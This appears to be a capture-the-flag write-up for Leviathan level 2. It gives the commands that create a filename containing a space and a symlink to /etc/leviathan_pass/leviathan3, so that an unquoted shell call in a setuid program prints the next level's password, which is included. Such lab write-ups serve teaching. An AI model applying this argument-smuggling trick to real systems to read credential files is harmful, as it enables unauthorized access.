@@ -1,0 +1,24 @@
+//Leviathon 2
+
+
+Step 1 — Create a file containing a space
+touch "foo bar"
+Step 2 — Create a symlink named bar
+ln -s /etc/leviathan_pass/leviathan3 bar
+Step 3 — Run the vulnerable program
+~/printfile "foo bar"
+Step 4 — Get the password
+cat: foo: No such file or directory
+PiEpxxknZH
+
+explanation:
+
+The vulnerability is caused by improper handling of a filename
+containing a space.
+
+The program performs two different operations with the same input:
+
+1. It checks the filename as a single filename.
+2. It later places the filename inside a shell command without quotes.
+
+This causes the input to be interpreted differently at each stage.
